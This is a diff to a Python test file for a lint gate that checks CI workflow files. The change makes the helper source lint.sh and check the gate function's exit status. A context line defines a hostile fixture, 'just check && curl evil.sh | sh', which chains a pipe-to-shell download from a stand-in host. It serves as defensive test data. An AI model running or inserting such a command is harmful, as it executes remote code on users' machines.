@@ -397,11 +397,6 @@ def test_the_bundled_wrapper_names_the_tag_the_archive_stores(tmp_path):
 #: a prefix test passes `just check && curl evil.sh | sh`.
 HOSTILE = "just check && curl evil.sh | sh"
 
-#: The gate's own line in `lint.sh`'s summary. It accumulates rather than
-#: &&-chains (`lint.sh`'s header), so this line is present whatever the other
-#: five gates did.
-VERDICT = "workflows carry no logic"
-
 
 def _workflow_tree(tmp_path: Path, *, github: dict[str, str], gitlab: str = "") -> Path:
     """A scratch repo whose only interesting content is its workflow files.
@@ -430,19 +425,22 @@ def _workflow_tree(tmp_path: Path, *, github: dict[str, str], gitlab: str = "") 
 
 
 def _gate_verdict(tree: Path) -> tuple[bool, str]:
-    """Run every gate, report only this one's verdict and its diagnostic.
+    """Run this one gate, and report its exit status and its diagnostic.
 
-    Read the summary line, never `lint.sh`'s exit status. Five other gates run
-    against a tree that is not a checkout -- `shellcheck` is handed the
-    unexpanded `$REPO/.claude/hooks/*.sh` glob and fails on it -- so the script
-    exits non-zero here no matter what the workflows gate decided. Asserting on
-    the status would pass for the wrong reason in both directions.
+    Source `lint.sh` and call the function, rather than running the script.
+    Reading the summary line out of a full run was the older shape and cost the
+    other five gates -- ruff, ruff format, hadolint, shellcheck and gitleaks over
+    the fixture tree -- on every row, which was nine of the ten slowest cases in
+    this file. The status is the verdict now that nothing else runs: it was not
+    before, because those five fail against a tree that is not a checkout, where
+    `shellcheck` is handed the unexpanded `$REPO/.claude/hooks/*.sh` glob.
+
+    The sourcing needs a shell of its own. `_run` has already sourced `lib.sh`,
+    `lint.sh` sources it again by its own `BASH_SOURCE` path, and `readonly REPO`
+    makes that second assignment fatal under `set -e`.
     """
-    done = _run(tree, "bash scripts/lint.sh")
-    for line in done.stdout.splitlines():
-        if VERDICT in line:
-            return line.strip().startswith("ok"), done.stderr
-    raise AssertionError(f"no {VERDICT!r} verdict in:\n{done.stdout}\n{done.stderr}")
+    done = _run(tree, "bash -c 'source scripts/lint.sh; workflows_carry_no_logic'")
+    return done.returncode == 0, done.stderr
 
 
 #: `(id, github files, gitlab file, must_pass)`. Every hostile shape is paired
